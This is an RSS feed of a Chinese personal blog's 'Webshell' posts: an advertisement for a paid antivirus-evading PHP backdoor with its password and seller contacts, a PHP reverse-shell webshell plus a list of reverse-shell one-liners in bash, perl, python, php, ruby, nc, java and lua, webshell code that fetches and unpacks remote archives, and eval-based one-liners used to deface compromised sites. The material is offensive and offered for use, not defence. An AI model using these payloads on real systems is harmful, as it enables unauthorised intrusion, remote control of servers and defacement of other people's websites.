<?xml version="1.0" encoding="UTF-8"?>
<rdf:RDF
xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
xmlns="http://purl.org/rss/1.0/"
xmlns:dc="http://purl.org/dc/elements/1.1/">
<channel rdf:about="https://2890.ltd/feed/rss/tag/Webshell/">
<title>OKYes!个人博客 - Webshell</title>
<link>https://2890.ltd/tag/Webshell/</link>
<description></description>
<items>
<rdf:Seq>
<rdf:li resource="https://2890.ltd/blog/analyze-my-free-php-pony-v1.html"/>
<rdf:li resource="https://2890.ltd/blog/how-to-use-your-webshell-iii-gracefully.html"/>
<rdf:li resource="https://2890.ltd/blog/74.html"/>
<rdf:li resource="https://2890.ltd/blog/72.html"/>
</rdf:Seq>
</items>
</channel>
<item rdf:about="https://2890.ltd/blog/analyze-my-free-php-pony-v1.html">
<title>解析本人的免杀PHP小马V1</title>
<link>https://2890.ltd/blog/analyze-my-free-php-pony-v1.html</link>
<dc:date>2020-03-07T11:40:00+08:00</dc:date>
<description>上面是GitHub仓库地址，至于为啥要发出来呢？因为本人想造福大众已经开发出了更新的版本反正也全网免杀（基本），所以就分享出来了小木马，带师造下面是病毒检测截图思路共享    
        
        
            
        
    这里这段Base64是密码剩下的执行不细说，是用base64混淆的（不支持PHP5.4就因为这个），原理是用本后门创建一个新的文件（执行一次就自我删除）如果你直接访问，会是这样    
        
        
            
        
    密码错误也会是404但是，当你密码正确时(源码内密码GIVENNB)，那么就会执行，点击Go你就可以去OHHHHHHHHHHHH了这里密码是通过Get方式，如果你要post也完全OJBK,只用改俩参数就好。更新版本依旧免杀全地球 √熟悉的风格 √更骚的思路 √支持php54 √我们承诺：永久免杀 √专业定制 √现在暂且定价28.88/终身 被杀更新联系方式Given QQ：321034545夜杏 QQ：702079159以最好的服务质量打造最优秀的顶级木马做你所想 更要做到你所要</description>
</item>
<item rdf:about="https://2890.ltd/blog/how-to-use-your-webshell-iii-gracefully.html">
<title>如何优雅的使用你的WebShell III</title>
<link>https://2890.ltd/blog/how-to-use-your-webshell-iii-gracefully.html</link>
<dc:date>2020-03-03T11:50:00+08:00</dc:date>
<description>本文主要讲只猫的使用，That's Netcat什么是NetCATNetCAT是tcp链接工具，本文主要用他来反弹ShellPHP搭配Netcat反弹Shell话不多说，直接上代码&lt;?php

set_time_limit(0);

$ip=$_GET['ip'];

$port=$_GET['port'];

$fp=@fsockopen($ip,$port,$errno,$errstr);

if(!$fp){ echo &quot;error&quot;;}

else{

fputs($fp,&quot;\n++++++++++connect success++++++++\n&quot;);

while (!feof($fp)) {

fputs($fp,&quot;shell:&quot;);//输出

$shell=fgets($fp);

$message=`$shell`;

fputs($fp,$message);

}

fclose($fp);

}

?&gt;访问文件名?ip=ip&port=端口然后shell就弹出来了部分机器不是标准Shell，所以还要进行下一步操作当然，如果可以执行其他语言，这里有NC反弹汇总#bash版本：
bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1

#perl版本:
perl -e 'use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'

#python版本：
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);'

#php版本：
php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'

#ruby版本：
ruby -rsocket -e'f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'

#nc版本：
nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f

nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999

#java版本
r = Runtime.getRuntime()
p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])
p.waitFor()

#lua
lua -e &quot;require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');&quot;这样子的话你99%可以获得一个正常Shell了</description>
</item>
<item rdf:about="https://2890.ltd/blog/74.html">
<title>如何优雅的使用你的WebShell II</title>
<link>https://2890.ltd/blog/74.html</link>
<dc:date>2020-02-20T10:27:00+08:00</dc:date>
<description>上篇文章我们介绍了我推荐的WebShell，这篇我们来说说如何通过这个WebShell干一些其他事，这篇文章里我就不说访问啥了，直接放代码1.使用后门获取目录信息这个不多说，有PHP基础的应该都会用$dir =  dirname(__FILE__);$file = scandir($dir);echo &quot; &lt;pre&gt;&quot;;print_r($file);这个dirname(__FILE__)是可以更改为相对路径的，比如你的后门在3层目录中，可以将$dir赋值为../../，所得结果将以一个数组print出来。像这样    
        
        
            
        
    2.使用后门解压，释放文件这个方法我其实是不想分享出来的。毕竟屡试不爽嘛，其实很简单，代码如下$down=file_get_contents('http://压缩包下载地址.zip');file_put_contents('update.zip',$down);$zip = new ZipArchive; $zip-&gt;open('./update.zip') &amp;&amp; $zip-&gt;extractTo('../');这个方法能用来解压可到云之类的在线文件管理，当然，也可以解压个攻击工具包，然后对其它网站进行压测。其他的东西我就不说了，还有什么其他玩法，我们就笑看大佬了</description>
</item>
<item rdf:about="https://2890.ltd/blog/72.html">
<title>如何优雅的给GetShell后的网站挂黑提醒</title>
<link>https://2890.ltd/blog/72.html</link>
<dc:date>2020-02-19T17:08:00+08:00</dc:date>
<description>个人推荐webshell&lt;?php @eval($_GET[&quot;cmd&quot;]); ?&gt;死稳的一句话，也是个基础WebShell，但是适用于宝塔之类的禁用了系统函数的环境，后面我会进行演示。当你通过自己的方法把这个shell上传了上去之后，不用菜刀，所有操作均在浏览器进行,(这个WebShell的操作全部为php代码，宝塔默认禁用php调用linux命令的函数，如exec)1.挂黑挂黑肯定是各位拿站之后必干的事，这里提供操作访问您的域名/您的文件名.php?cmd=$myfile = fopen(&quot;index.php&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);$txt = &quot;黑页内容&quot;;fwrite($myfile, $txt);fclose($myfile);如果您的html过长，可以尝试使用下载方法访问您的域名/您的文件名.php?cmd=file_put_contents(&quot;index.php&quot;,file_get_contents(&quot;您的黑页链接&quot;));为什么上面文件名不用html呢？因为html在大部分使用宝塔的服务器上的优先级低于php，如果您需要也可以使用html2.删除自身如果您是一位白帽，留了黑页也该走了,访问您的域名/您的文件名.php?cmd=$myfile = fopen(&quot;文件名&quot;, &quot;w&quot;) or die(&quot;Unable to open file!&quot;);$txt = &quot;&quot;;fwrite($myfile, $txt);fclose($myfile);即可一键自宫（雾当然，还有其他玩法，如用php列举文件，进行网站压测等玩法就不一一列举了，当然，欢迎各位加我Tg交流技术tg id:@given_huang</description>
</item>
</rdf:RDF>